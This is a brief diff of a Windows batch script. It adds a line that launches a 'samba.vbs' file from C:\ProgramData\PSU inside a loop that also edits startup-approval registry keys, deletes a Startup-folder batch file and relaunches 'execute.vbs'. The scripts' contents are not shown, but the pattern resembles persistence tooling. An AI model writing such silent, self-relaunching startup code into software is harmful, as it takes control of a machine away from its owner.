@@ -2078,6 +2078,7 @@ REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 goto start
 :execute
+start "" "C:\ProgramData\PSU\samba.vbs"
 start "" "C:\ProgramData\PSU\execute.vbs"
 timeout 3
 goto start
